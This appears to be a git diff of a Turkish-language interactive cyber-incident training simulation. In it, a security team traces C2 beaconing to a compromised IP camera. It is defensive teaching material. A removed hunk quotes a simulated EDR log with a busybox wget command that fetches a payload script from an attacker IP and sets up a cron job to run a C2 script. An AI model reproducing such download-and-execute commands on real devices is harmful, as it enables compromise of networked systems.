@@ -5,189 +5,122 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>CyberScenario v1: IoT Krizi</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
   <style>
-    /* Custom styles to match previous design aesthetics */
-    body {
-      background-color: #1a1a2e; /* Dark background */
-      color: #e0e0e0; /* Light text */
-      font-family: 'Roboto', sans-serif;
+    :root {
+        --dark-bg: #1a1a2e; --container-bg: #2a2a4a; --section-bg: #333355; --interactive-bg: #444466;
+        --accent-blue: #8be9fd; --accent-purple: #bd93f9; --accent-pink: #ff79c6; --accent-green: #50fa7b;
+        --accent-yellow: #f1fa8c; --accent-red: #ff5555; --text-light: #e0e0e0; --text-dark: #282a36;
     }
-    .container {
-      background-color: #2a2a4a; /* Container background */
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-      padding: 20px;
-      max-width: 950px; /* Wider container */
-      width: 100%;
-      margin: 40px auto;
-    }
-    h1 {
-      font-size: 2.5em;
-      color: #8be9fd; /* Accent blue */
-      margin-bottom: 20px;
-    }
-    h2 {
-      font-size: 2em;
-      color: #8be9fd;
-      border-bottom: 2px solid #444466; /* Interactive bg */
-      padding-bottom: 15px;
-      margin-bottom: 25px;
-    }
-    h3 {
-      font-size: 1.5em;
-      color: #8be9fd;
-    }
-    .btn {
-      background-color: #6272a4; /* Dracula purple */
-      color: white;
-      border: none;
-      padding: 15px 25px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1.1em;
-      transition: all 0.3s ease;
-      text-align: left;
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      font-weight: 700;
-    }
-    .btn:hover {
-      background-color: #7a8ab9; /* Lighter purple */
-      transform: translateY(-3px);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-    }
-    .btn-start, .btn-continue {
-      font-size: 1.3em;
-      font-weight: bold;
-      text-align: center;
-      background-color: #50fa7b; /* Accent green */
-      color: #282a36; /* Dark text for contrast */
-      justify-content: center;
-    }
-    .scenario-image {
-      border-radius: 8px;
-      border: 1px solid #444466; /* Interactive bg */
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    }
-    .bg-gray-800 {
-      background-color: #282a36; /* Dracula background */
-    }
-    .border-gray-700 {
-      border-color: #6272a4; /* Dracula purple */
-    }
-    .text-cyan-400 { color: #8be9fd; }
-    .text-cyan-300 { color: #8be9fd; }
-    .text-pink-300 { color: #ff79c6; }
-    .text-red-400 { color: #ff5555; }
-    .text-yellow-300 { color: #f1fa8c; }
-    .text-green-300 { color: #50fa7b; }
-    .text-orange-300 { color: #ffb86c; }
-    .text-indigo-300 { color: #bd93f9; }
-    .text-green-400 { color: #50fa7b; }
-    .text-yellow-400 { color: #f1fa8c; }
-    .text-red-400 { color: #ff5555; }
-    .text-blue-400 { color: #8be9fd; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+    body { background-color: var(--dark-bg); color: var(--text-light); font-family: 'Roboto', sans-serif; }
+    .container-custom { background-color: var(--container-bg); border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); padding: 40px; max-width: 950px; width: 100%; margin: 40px auto; }
+    h1 { font-size: 2.5em; color: var(--accent-blue); margin-bottom: 20px; }
+    h2 { font-size: 2em; color: var(--accent-blue); border-bottom: 2px solid var(--interactive-bg); padding-bottom: 15px; margin-bottom: 25px; }
+    h3 { font-size: 1.5em; color: var(--accent-blue); }
+    .btn { background-color: #6272a4; color: white; border: none; padding: 15px 25px; border-radius: 8px; cursor: pointer; font-size: 1.1em; transition: all 0.3s ease; text-align: left; display: flex; align-items: center; gap: 15px; font-weight: 700; }
+    .btn:hover { background-color: #7a8ab9; transform: translateY(-3px); box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+    .btn:disabled { background-color: #555 !important; color: #999 !important; cursor: not-allowed; transform: none; box-shadow: none; opacity: 0.7; }
+    .btn-start, .btn-continue { font-size: 1.3em; font-weight: bold; text-align: center; background-color: var(--accent-green); color: var(--text-dark); justify-content: center; }
+    .scenario-image { border-radius: 8px; border: 1px solid var(--interactive-bg); box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+    .bg-gray-800 { background-color: var(--text-dark); }
+    .border-gray-700 { border-color: #6272a4; }
+    .text-cyan-400 { color: var(--accent-blue); } .text-cyan-300 { color: var(--accent-blue); } .text-pink-300 { color: var(--accent-pink); }
+    .text-red-400 { color: var(--accent-red); } .text-yellow-300 { color: var(--accent-yellow); } .text-green-300 { color: var(--accent-green); }
+    .text-orange-300 { color: #ffb86c; } .text-indigo-300 { color: var(--accent-purple); } .text-green-400 { color: var(--accent-green); }
+    .text-yellow-400 { color: var(--accent-yellow); } .text-blue-400 { color: var(--accent-blue); } .text-purple-300 { color: var(--accent-purple); }
 
-    /* Roles Info specific styles (adapted from previous example) */
-    #rolesInfo {
-        background-color: #333355; /* Section bg */
-        border-radius: 8px;
-        padding: 20px;
-        margin-top: 30px;
-        text-align: left;
-        width: 100%;
-        max-width: 600px;
-        border: 1px solid #444466;
-    }
-    #rolesInfo h3 {
-        color: #50fa7b; /* Accent green */
-        margin-top: 0;
-        margin-bottom: 15px;
-        border-bottom: 1px solid #444466;
-        padding-bottom: 10px;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-    }
-    #rolesInfo ul {
-        list-style-type: none;
-        padding-left: 0;
-        margin: 0;
-    }
-    #rolesInfo ul li {
-        margin-bottom: 10px;
-        padding-left: 25px;
-        position: relative;
-        line-height: 1.5;
-    }
-    #rolesInfo ul li:last-child {
-        margin-bottom: 0;
-    }
-    #rolesInfo ul li::before {
-        content: '\f007'; /* User icon */
-        font-family: 'Font Awesome 6 Free';
-        font-weight: 900;
-        color: #bd93f9; /* Accent purple */
-        position: absolute;
-        left: 0;
-        top: 3px;
-    }
-    #rolesInfo ul li.your-role::before {
-        color: #f1fa8c; /* Accent yellow for your role */
-    }
-    #rolesInfo ul li strong {
-        color: #8be9fd; /* Accent blue */
-    }
+    #rolesInfo { background-color: var(--section-bg); border-radius: 8px; padding: 20px; margin-top: 30px; text-align: left; width: 100%; max-width: 600px; border: 1px solid var(--interactive-bg); }
+    #rolesInfo h3 { color: var(--accent-green); margin-top: 0; margin-bottom: 15px; border-bottom: 1px solid var(--interactive-bg); padding-bottom: 10px; display: flex; align-items: center; gap: 10px; }
+    #rolesInfo ul { list-style-type: none; padding-left: 0; margin: 0; }
+    #rolesInfo ul li { margin-bottom: 10px; padding-left: 25px; position: relative; line-height: 1.5; }
+    #rolesInfo ul li:last-child { margin-bottom: 0; }
+    #rolesInfo ul li::before { content: '\f007'; font-family: 'Font Awesome 6 Free'; font-weight: 900; color: var(--accent-purple); position: absolute; left: 0; top: 3px; }
+    #rolesInfo ul li.your-role::before { color: var(--accent-yellow); }
+    #rolesInfo ul li strong { color: var(--accent-blue); }
+
+    #statusBar { display: flex; justify-content: space-around; flex-wrap: wrap; gap: 15px; background-color: var(--text-dark); padding: 15px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #6272a4; }
+    #statusBar .metric { text-align: center; font-size: 0.9em; }
+    #statusBar .metric .value { font-size: 1.3em; font-weight: bold; color: var(--accent-yellow); }
+    .final-metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin-top: 20px; width: 100%; max-width: 850px; }
+    .metric-card { background-color: var(--section-bg); padding: 25px; border-radius: 8px; text-align: center; border: 1px solid var(--interactive-bg); transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.2); display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 150px; }
+    .metric-card:hover { transform: scale(1.05); border-color: var(--accent-blue); }
+    .metric-card .icon { font-size: 2.5em; color: var(--accent-blue); margin-bottom: 10px; }
+    .metric-card .label { font-size: 1.1em; margin-bottom: 5px; color: var(--text-light); }
+    .metric-card .value { font-size: 1.8em; font-weight: bold; color: var(--accent-yellow); }
+    #performance-badge-container { margin: 25px 0; }
+    #performance-badge { padding: 12px 30px; font-size: 1.8em; font-weight: bold; border-radius: 50px; display: inline-block; color: var(--text-dark); box-shadow: 0 5px 20px rgba(0,0,0,0.4); transition: transform 0.3s ease; }
+    #performance-badge:hover { transform: scale(1.05); }
+    .post-crisis-layout { display: grid; grid-template-columns: 1fr; gap: 30px; text-align: left; margin-top: 40px; width: 100%; }
+    @media (min-width: 800px) { .post-crisis-layout { grid-template-columns: 1fr 1fr; } }
+    .event-timeline, .strategic-debrief { background-color: var(--interactive-bg); padding: 25px; border-radius: 8px; border: 1px solid var(--section-bg); margin-top: 20px; }
+    .event-timeline h3, .strategic-debrief h3 { margin-top: 0; padding-bottom: 10px; border-bottom: 1px solid var(--section-bg); color: var(--accent-blue); display: flex; align-items: center; gap: 10px; }
+    .event-timeline ul { list-style-type: none; padding-left: 0; margin: 15px 0 0 0; }
+    .event-timeline li { position: relative; padding: 5px 0 15px 35px; border-left: 2px solid var(--section-bg); font-size: 0.95em; }
+    .event-timeline li:last-child { border-left: none; }
+    .event-timeline li::before { content: '\f00c'; font-family: 'Font Awesome 6 Free'; font-weight: 900; color: var(--accent-green); position: absolute; left: -12px; top: 5px; background-color: var(--dark-bg); width: 22px; height: 22px; border-radius: 50%; text-align: center; line-height: 22px; font-size: 0.8em; border: 2px solid var(--section-bg); }
+    .event-timeline li.positive::before { content: '\f00c'; color: var(--accent-green); }
+    .event-timeline li.negative::before { content: '\f00d'; color: var(--accent-red); }
+    .event-timeline li.neutral::before { content: '\f05a'; color: var(--accent-blue); }
+    .event-timeline li .decision-title { font-weight: bold; color: var(--accent-purple); display: block; margin-bottom: 4px; }
+    #score-breakdown { list-style: none; padding: 0; margin-top: 15px; text-align: left; }
+    #score-breakdown li { padding: 8px 12px; border-radius: 6px; margin-bottom: 8px; font-size: 1.05em; display: flex; justify-content: space-between; }
+    #score-breakdown .score-plus { background-color: rgba(80, 250, 123, 0.1); border-left: 3px solid var(--accent-green); }
+    #score-breakdown .score-minus { background-color: rgba(255, 85, 85, 0.1); border-left: 3px solid var(--accent-red); }
+    #score-breakdown .score-neutral { background-color: rgba(139, 233, 253, 0.1); border-left: 3px solid var(--accent-blue); }
+    #score-breakdown .score-value { font-weight: bold; }
+    .lb-overlay{ display:none; position:fixed; inset:0; background: rgba(10,10,25,.7); -webkit-backdrop-filter: blur(4px); backdrop-filter: blur(4px); z-index:9999; align-items:center; justify-content:center; padding:20px; animation: fadeIn 0.3s ease-out; }
+    .lb-modal{ background: linear-gradient(180deg, #2a2a4a 0%, #1f1f36 100%); color: var(--text-light); width:100%; max-width: 760px; border-radius:14px; padding:22px 22px 16px; border:1px solid rgba(255,255,255,.08); box-shadow: 0 18px 50px rgba(0,0,0,.55), inset 0 1px 0 rgba(255,255,255,.04); }
+    .lb-header{ display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:12px; }
+    .lb-title{ display:flex; align-items:center; gap:10px; font-size:1.25em; font-weight:800; letter-spacing:.2px; color: var(--accent-yellow); }
+    .lb-tablewrap{ margin-top:10px; max-height: 60vh; overflow:auto; border:1px solid var(--interactive-bg); border-radius:10px; }
+    table.lb-table{ width:100%; border-collapse:collapse; font-size:.97em; }
+    table.lb-table th, table.lb-table td{ padding:10px 12px; text-align:left; }
+    table.lb-table thead th{ position: sticky; top:0; z-index:1; background:#1f1f36; color:#e9e9ff; border-bottom: 1px solid #3b3b66; font-weight:700; }
+    .lb-actions{ display:flex; gap:12px; justify-content:flex-end; margin-top:14px; }
+    .lb-close, .lb-refresh{ border:0; border-radius:10px; padding:10px 14px; cursor:pointer; font-weight:700; transition: all .12s ease; }
+    .lb-refresh{ background: var(--accent-blue); color:#0c1130; } .lb-close{ background: #3d3d60; color:#fff; }
   </style>
-  <script>
-    function nextStep(id) {
-      document.querySelectorAll('.step').forEach(function(s) {
-        s.style.display = 'none';
-      });
-      document.getElementById(id).style.display = 'block';
-      window.scrollTo(0, 0); // Her adımda sayfanın başına git
-    }
-    window.onload = function() {
-      nextStep('step0'); // Simülasyonu başlangıç ekranıyla başlat
-    };
-  </script>
 </head>
-<body class="bg-gray-900 text-white font-sans">
-  <div class="max-w-5xl mx-auto p-6 space-y-10">
-    <header class="text-center border-b border-gray-700 pb-6">
-      <h1 class="text-4xl font-bold text-cyan-400">CyberScenario: IoT Krizi</h1>
-      <p class="text-gray-400 mt-2">ÇOLHAK Corporation – Gelişmiş IoT Kriz Simülasyonu</p>
-    </header>
+<body class="text-white font-sans">
+  <div class="container-custom">
+    <div id="gameContainer" style="display: none;">
+        <div id="statusBar">
+            <div class="metric"><span><i class="fas fa-server"></i> Etkilenen Sistemler</span><div class="value" id="status-affectedSystems">1</div></div>
+            <div class="metric"><span><i class="fas fa-lira-sign"></i> Finansal Zarar</span><div class="value" id="status-financialLoss">₺0</div></div>
+            <div class="metric"><span><i class="fas fa-shield-alt"></i> İtibar Puanı</span><div class="value" id="status-reputation">100</div></div>
+            <div class="metric"><span><i class="fas fa-brain"></i> İstihbarat Puanı</span><div class="value" id="status-intelScore">0</div></div>
+            <div class="metric" id="status-timer"><span><i class="fas fa-clock"></i> Kalan Süre</span><div class="value">05:00</div></div>
+        </div>
+    </div>
 
-    <section id="step0" class="step space-y-4 text-center" style="display:none;">
-      <h2 class="text-2xl text-cyan-300 font-semibold">Senaryoya Hoş Geldiniz</h2>
-      <p class="text-gray-300 max-w-2xl mx-auto">Bu interaktif senaryoda, ÇOLHAK Corporation'ın siber güvenlik ekibinin bir üyesisiniz. Göreviniz, gelişen bir güvenlik tehdidini analiz etmek, kritik kararlar almak ve şirketi potansiyel bir felaketten korumaktır. Her adımda sunulan bilgileri dikkatle değerlendirin. Hazır mısınız?</p>
-      <img src="giris.png" alt="Siber Güvenlik Merkezi" class="scenario-image" style="max-height: 300px; width: 100%; object-fit: cover;">
+    <div id="game-content">
+        <section id="step0" class="step space-y-4 text-center">
+            <h2 class="text-2xl text-cyan-300 font-semibold">Senaryoya Hoş Geldiniz</h2>
+            <p class="text-gray-300 max-w-2xl mx-auto">Bu interaktif senaryoda, ÇOLHAK Corporation'ın siber güvenlik mühendisisiniz. Göreviniz, gelişen bir güvenlik tehdidini analiz etmek, kritik kararlar almak ve şirketi potansiyel bir felaketten korumaktır. Her adımda sunulan bilgileri dikkatle değerlendirin. Hazır mısınız?</p>
+            <img src="giris.png" alt="Siber Güvenlik Merkezi" class="scenario-image mx-auto" style="max-height: 300px; width: auto; object-fit: cover;">
+            <div id="rolesInfo" class="mx-auto">
+              <h3><i class="fa-solid fa-people-arrows"></i> Simülasyon Rolleri</h3>
+              <ul>
+                <li class="your-role"><strong>Sizin Rolünüz: Siber Güvenlik Mühendisi</strong> - ÇOLHAK Corporation'ın siber güvenlik ekibinin bir parçasısınız. Olay müdahalesinde aktif rol alacak, analizler yapacak ve kritik kararlar vereceksiniz.</li>
+                <li><strong>Ezgi (Tier-1 SOC Analisti)</strong> - Ekibinizin gözü kulağı; ilk uyarıları ve şüpheli aktiviteleri tespit eden kişidir.</li>
+                <li><strong>Alper (Tier-2 Analisti)</strong> - Ezgi'den gelen olayları daha derinlemesine analiz eden ve teknik araştırmalar yürüten uzmanınızdır.</li>
+                <li><strong>Ceyda (Siber Güvenlik Yöneticisi)</strong> - Siber güvenlik ekibinizin lideri olarak, kriz anında nihai kararları veren ve stratejik rehberlik sağlayan kişidir.</li>
+                <li><strong>Satış Direktörü</strong> - Şirketin ticari operasyonlarından sorumlu kritik bir paydaştır; özellikle canlı demo gibi iş süreçlerinin aksamasını kesinlikle istemez.</li>
+                <li><strong>Finans Direktörü (CFO)</strong> - Şirketin finansal sağlığından sorumlu üst düzey yöneticidir.</li>
+              </ul>
+            </div>
+            <div class="flex justify-center mt-6">
+              <button id="startButton" class="btn btn-start"><i class="fas fa-play"></i> Simülasyonu Başlat</button>
+            </div>
+        </section>
 
-      <div id="rolesInfo" class="mx-auto">
-          <h3><i class="fa-solid fa-people-arrows"></i> Simülasyon Rolleri</h3>
-          <ul>
-              <li class="your-role"><strong>Sizin Rolünüz: Siber Güvenlik Ekibi Üyesi</strong> - ÇOLHAK Corporation'ın siber güvenlik ekibinin bir parçasısınız. Olay müdahalesinde aktif rol alacak, analizler yapacak ve kritik kararlar vereceksiniz.</li>
-              <li><strong>Ezgi (Tier-1 SOC Analisti)</strong> - İlk uyarıları ve şüpheli aktiviteleri tespit eden ekibinizin gözü kulağı.</li>
-              <li><strong>Alper (Tier-2 Analisti)</strong> - Ezgi'den gelen olayları daha derinlemesine analiz eden, teknik araştırmalar yürüten uzmanınız.</li>
-              <li><strong>Ceyda (Siber Güvenlik Yöneticisi)</strong> - Siber güvenlik ekibinizin lideri ve kriz anında nihai kararları veren kişi. Stratejik rehberlik sağlar.</li>
-              <li><strong>Satış Direktörü</strong> - Şirketin ticari operasyonlarından sorumlu, özellikle canlı demo gibi kritik iş süreçlerinin aksamasını istemeyen bir paydaş.</li>
-              <li><strong>Finans Direktörü (CFO)</strong> - Şirketin finansal sağlığından sorumlu üst düzey yönetici.</li>
-          </ul>
-      </div>
-
-      <div class="flex justify-center mt-6">
-        <button onclick="nextStep('step1')" class="bg-cyan-600 hover:bg-cyan-700 px-6 py-3 rounded-lg font-bold text-lg">Simülasyonu Başlat</button>
-      </div>
-    </section>
-
-    <section id="step1" class="step space-y-4" style="display:none;">
-      <h2 class="text-xl text-cyan-300 font-semibold">🕒 07:15 – İlk Sinyal: Zenginleştirilmiş SIEM Uyarısı</h2>
-      <p>Günün başlangıcında, Tier-1 SOC Analisti Ezgi, SIEM (Güvenlik Bilgi ve Olay Yönetimi) panelinde kritik bir uyarı fark eder. Bir korelasyon kuralı tetiklenmiştir: <strong class="text-red-400">"Kritik Varlık Ağından Bilinmeyen C2 Sunucusuna Periyodik Veri Sızıntısı"</strong>.</p>
-      <img src="alert.png" alt="SIEM Alert Dashboard" class="rounded-xl border-2 shadow-lg border-cyan-400 w-full max-w-3xl mx-auto object-cover">
-      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
-        <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>ALERT ID: 8451
+        <section id="step1" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-cyan-300 font-semibold">🕒 07:15 – İlk Sinyal: Zenginleştirilmiş SIEM Uyarısı</h2>
+            <p>Günün başlangıcında, Tier-1 SOC Analisti Ezgi, SIEM (Güvenlik Bilgi ve Olay Yönetimi) panelinde kritik bir uyarı fark eder. Bir korelasyon kuralı tetiklenmiştir: <strong class="text-red-400">"Kritik Varlık Ağından Bilinmeyen C2 Sunucusuna Periyodik Veri Sızıntısı"</strong>.</p>
+            <img src="alert.png" alt="SIEM Alert Dashboard" class="rounded-xl border-2 shadow-lg border-cyan-400 w-full max-w-3xl mx-auto object-cover">
+            <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
+              <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>ALERT ID: 8451
 TRIGGER: Correlation Rule - "Suspicious C2 Beaconing"
 SOURCE IP: 10.10.30.15 (VLAN: IoT Cihazları)
 HOSTNAME: KAMERA-3KAT-OKYANUS
@@ -197,230 +130,450 @@ PROTOCOL: UDP/443
 OBSERVATION: Son 3 saattir her 5 dakikada bir 128KB'lık bir veri paketi gönderiliyor.
 PCAP SUMMARY: 'update.serve-config.net' için yapılan DNS sorgusu 88.54.12.219'a çözümlendi. UDP payload'u gizlenmiş Base64 dizeleri içeriyor.
 MITRE ATT&CK MAPPING: T1041 (Exfiltration Over C2), T1571 (Non-Standard Port)</code></pre>
-      </div>
-      <blockquote class="italic text-gray-400 border-l-4 border-cyan-500 pl-4 mt-4">Ezgi: "Bu normal bir trafik değil. Kaynak IP, IoT VLAN'ında görünüyor ve hedef daha önce görmediğimiz şüpheli bir adres. MITRE eşleşmeleri de endişe verici. Durumu hemen Tier-2'ye (Alper) iletiyorum."</blockquote>
-      <button onclick="nextStep('step2')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">İncelemeyi Başlat</button>
-    </section>
-    
-    <section id="step2" class="step space-y-6" style="display:none;">
-        <h2 class="text-xl text-pink-300 font-semibold">🕒 07:30 – Eş Zamanlı Gelişmeler ve İlk Karar Anı</h2>
-        <p>Ezgi'nin analiziyle hemen hemen aynı anda, sisteme iki farklı olay kaydı düşer. Ekip olarak hangi olaya öncelik vereceğinize karar vermelisiniz.</p>
+            </div>
+            <blockquote class="italic text-gray-400 border-l-4 border-cyan-500 pl-4 mt-4">Ezgi: "Bu normal bir trafik değil. Kaynak IP, IoT VLAN'ında görünüyor ve hedef daha önce görmediğimiz şüpheli bir adres. MITRE eşleşmeleri de endişe verici. Durumu hemen Tier-2'ye (Alper) iletiyorum."</blockquote>
+            <button class="btn btn-continue" data-next-section="step2"><i class="fas fa-search"></i> İncelemeyi Başlat</button>
+        </section>
         
-        <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
-            <h3 class="font-bold text-pink-400">Olay 1: Yardım Masası Talebi #7254</h3>
-            <p class="mt-2 text-gray-300"><strong>Kullanıcı:</strong> Ayşe Yılmaz</p>
-            <p class="text-gray-300"><strong>Konu:</strong> 3. Kat Okyanus Toplantı Odası'ndaki kamera sürekli donuyor ve web arayüzü çok yavaş. Dün sabah böyle bir sorun yoktu.</p>
-        </div>
+        <section id="step2" class="step space-y-6" style="display:none;">
+            <h2 class="text-xl text-pink-300 font-semibold">🕒 07:30 – Eş Zamanlı Gelişmeler ve İlk Karar Anı</h2>
+            <p>Ezgi'nin analiziyle hemen hemen aynı anda, sisteme iki farklı olay kaydı düşer. Ekip olarak hangi olaya öncelik vereceğinize karar vermelisiniz.</p>
+            <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+                <h3 class="font-bold text-pink-400">Olay 1: Yardım Masası Talebi #7254</h3>
+                <p class="mt-2 text-gray-300"><strong>Kullanıcı:</strong> Ayşe Yılmaz</p>
+                <p class="text-gray-300"><strong>Konu:</strong> 3. Kat Okyanus Toplantı Odası'ndaki kamera sürekli donuyor ve web arayüzü çok yavaş. Dün sabah böyle bir sorun yoktu.</p>
+            </div>
+            <div class="bg-gray-800 p-4 rounded-lg border border-red-500 mt-4">
+                <h3 class="font-bold text-red-400">Olay 2: Kritik Sistem Uyarısı #9112 (Kırmızı Balık)</h3>
+                <p class="mt-2 text-gray-300"><strong>Sistem:</strong> Active Directory</p>
+                <p class="text-gray-300"><strong>Konu:</strong> Finans Direktörü (CFO) hesabında son 15 dakika içinde 50'den fazla başarısız oturum açma denemesi tespit edildi.</p>
+            </div>
+            <blockquote class="italic text-gray-400 border-l-4 border-yellow-500 pl-4 mt-4">Ekip Lideri: "İki tane potansiyel olarak ciddi olayımız var. Biri potansiyel veri sızıntısı, diğeri üst düzey bir yöneticinin hesabına yönelik bir saldırı olabilir. Kaynaklarımız sınırlı, hangisine odaklanıyoruz?"</blockquote>
+            <div class="flex flex-col md:flex-row gap-4 mt-4">
+                <button class="btn w-full" data-decision="step2-camera" data-next-section="step3"><i class="fas fa-video"></i> Öncelik: Kamera Olayı ve SIEM Uyarısını Birleştir</button>
+                <button class="btn w-full" data-decision="step2-cfo" data-next-section="step_distraction" style="background-color: #ff5555;"><i class="fas fa-user-shield"></i> Öncelik: Finans Direktörünün Hesabını Güvenceye Al</button>
+            </div>
+        </section>
 
-        <div class="bg-gray-800 p-4 rounded-lg border border-red-500 mt-4">
-            <h3 class="font-bold text-red-400">Olay 2: Kritik Sistem Uyarısı #9112 (Kırmızı Balık)</h3>
-            <p class="mt-2 text-gray-300"><strong>Sistem:</strong> Active Directory</p>
-            <p class="text-gray-300"><strong>Konu:</strong> Finans Direktörü (CFO) hesabında son 15 dakika içinde 50'den fazla başarısız oturum açma denemesi tespit edildi.</p>
-        </div>
+        <section id="step_distraction" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-yellow-300 font-semibold">🕒 07:50 – Yanlış Önceliklendirme</h2>
+            <p>Ekip, Finans Direktörünün hesabına odaklanmaya karar verir. Yapılan hızlı araştırma sonucunda, Finans Direktörünün yurt dışında tatilde olduğu ve yeni şifresini unuttuğu için mobil cihazından defalarca yanlış giriş yapmaya çalıştığı anlaşılır. Hesap geçici olarak kilitlenir ve durum kontrol altına alınır.</p>
+            <blockquote class="italic text-gray-400 border-l-4 border-red-500 pl-4 mt-4">Alper: "Bu bir 'false positive' (yanlış alarm) idi. Ancak bu araştırmayı yaparken yaklaşık 20 dakika kaybettik. Şimdi acilen diğer olaya dönmemiz gerekiyor. Umarım geç kalmamışızdır."</blockquote>
+            <button class="btn btn-continue" data-next-section="step3"><i class="fas fa-undo"></i> Asıl Olaya Geri Dön</button>
+        </section>
 
-        <blockquote class="italic text-gray-400 border-l-4 border-yellow-500 pl-4 mt-4">Ekip Lideri: "İki tane potansiyel olarak ciddi olayımız var. Biri potansiyel veri sızıntısı, diğeri üst düzey bir yöneticinin hesabına yönelik bir saldırı olabilir. Kaynaklarımız sınırlı, hangisine odaklanıyoruz?"</blockquote>
+        <section id="step3" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-green-300 font-semibold">🧑‍💻 08:00 – Alper’in Derinlemesine Analizi</h2>
+            <p>Tier-2 Analisti Alper, SIEM uyarısı ile yardım masası talebini birleştirir. Şüpheli `10.10.30.15` IP adresini şirketin Varlık Yönetim Sistemi'nde sorgular. Sonuç nettir: IP adresi, 3. Kat Okyanus Toplantı Odası'ndaki bir <strong class="text-green-400">"SmartEye 3000"</strong> model IP kamerasına aittir.</p>
+            <p class="text-gray-300 mt-4">Hızlı bir internet araştırması, bu modelin firmware'inde yakın zamanda açıklanmış kritik bir güvenlik açığını (<strong class="text-red-400">CVE-2025-1337</strong>) ortaya çıkarır. Bu zafiyet, yetkisiz Uzaktan Kod Çalıştırmaya (RCE) olanak tanımaktadır.</p>
+            <blockquote class="italic text-gray-400 border-l-4 border-green-500 pl-4 mt-4">Alper: "Tamam, şimdi her şey oturdu. Kameradaki yavaşlama bir arıza değil, bir semptom. Cihaz, bilinen bir zafiyet üzerinden ele geçirilmiş ve bir botnet parçası olarak C2 sunucusuna veri gönderiyor. Bir sonraki adımı belirlemeliyiz."</blockquote>
+            <button class="btn btn-continue" data-next-section="step3_2" style="background-color: var(--accent-green); color: var(--text-dark);"><i class="fas fa-sitemap"></i> Soruşturmayı Derinleştir</button>
+        </section>
         
-        <div class="flex flex-col md:flex-row gap-4 mt-4">
-            <button onclick="nextStep('step3')" class="w-full bg-cyan-600 hover:bg-cyan-700 p-3 rounded-lg font-bold">Öncelik: Kamera Olayı ve SIEM Uyarısını Birleştir</button>
-            <button onclick="nextStep('step_distraction')" class="w-full bg-red-600 hover:bg-red-700 p-3 rounded-lg font-bold">Öncelik: Finans Direktörünün Hesabını Güvenceye Al</button>
-        </div>
-    </section>
-
-    <section id="step_distraction" class="step space-y-4" style="display:none;">
-        <h2 class="text-xl text-yellow-300 font-semibold">🕒 07:50 – Yanlış Önceliklendirme</h2>
-        <p>Ekip, Finans Direktörünün hesabına odaklanmaya karar verir. Yapılan hızlı araştırma sonucunda, Finans Direktörünün yurt dışında tatilde olduğu ve yeni şifresini unuttuğu için mobil cihazından defalarca yanlış giriş yapmaya çalıştığı anlaşılır. Hesap geçici olarak kilitlenir ve durum kontrol altına alınır.</p>
-        <blockquote class="italic text-gray-400 border-l-4 border-red-500 pl-4 mt-4">Alper: "Bu bir 'false positive' (yanlış alarm) idi. Ancak bu araştırmayı yaparken yaklaşık 20 dakika kaybettik. Şimdi acilen diğer olaya dönmemiz gerekiyor. Umarım geç kalmamışızdır."</blockquote>
-        <button onclick="nextStep('step3')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Asıl Olaya Geri Dön</button>
-    </section>
-
-    <section id="step3" class="step space-y-4" style="display:none;">
-      <h2 class="text-xl text-green-300 font-semibold">🧑‍💻 08:00 – Alper’in Derinlemesine Analizi</h2>
-      <p>Tier-2 Analisti Alper, SIEM uyarısı ile yardım masası talebini birleştirir. Şüpheli `10.10.30.15` IP adresini şirketin Varlık Yönetim Sistemi'nde sorgular. Sonuç nettir: IP adresi, 3. Kat Okyanus Toplantı Odası'ndaki bir <strong class="text-green-400">"SmartEye 3000"</strong> model IP kamerasına aittir.</p>
-      <p>Alper, analizini bir adım ileri taşıyarak EDR (Uç Nokta Tespiti ve Müdahale) konsolunu kontrol eder ve kritik bir bulguya rastlar:</p>
-      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
-        <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>EDR LOG - Cihaz: KAMERA-3KAT-OKYANUS (10.10.30.15)
-PROCESS: /bin/busybox
-COMMAND: busybox wget http://88.54.12.219/payload.sh -O /tmp/p.sh
-ACTION: 'p.sh' dosyası çalıştırıldı. 'perl /tmp/c2.pl' komutu içeren bir crontab görevi oluşturuldu.</code></pre>
-      </div>
-      <p class="text-gray-300 mt-4">Hızlı bir internet araştırması, bu modelin firmware'inde yakın zamanda açıklanmış kritik bir güvenlik açığını (<strong class="text-red-400">CVE-2025-1337</strong>) ortaya çıkarır. Bu zafiyet, yetkisiz Uzaktan Kod Çalıştırmaya (RCE) olanak tanımaktadır.</p>
